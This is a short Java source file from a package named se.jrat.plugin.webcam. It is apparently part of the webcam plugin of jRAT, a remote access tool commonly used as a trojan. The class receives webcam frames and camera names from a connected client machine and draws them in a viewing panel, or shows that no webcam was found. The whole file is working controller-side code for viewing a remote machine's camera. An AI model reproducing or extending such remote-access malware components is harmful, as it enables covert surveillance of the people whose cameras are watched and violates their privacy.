package se.jrat.plugin.webcam.client;

import java.awt.Graphics;
import java.awt.image.BufferedImage;

import jrat.api.Client;
import jrat.api.net.PacketListener;

public class Packet120Webcam extends PacketListener {

	@Override
	public void perform(Client client) {
		try {
			String name = WebcamPlugin.readString(client.getDataReader());

			PanelWebcam panel = (PanelWebcam) WebcamPlugin.entry.getInstances().get(client);
			
			if (name.equals("DISABLED")) {
				WebcamPlugin.enabled = false;

				if (panel != null) {
					panel.setNoWebcamFound();
				}
			} else {
				int size = client.getDataReader().readInt();
				byte[] buffer = new byte[size];
				client.getDataReader().readFully(buffer, 0, buffer.length);
				
				if (panel != null) {
					panel.setCamName(name);

					BufferedImage image = ImageUtils.decodeImage(buffer);

					Graphics g = panel.image.getGraphics();
					g.drawImage(image, 0, 0, panel.image.getWidth(), panel.image.getHeight(), null);

					panel.lbl.repaint();
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}		
	}

}
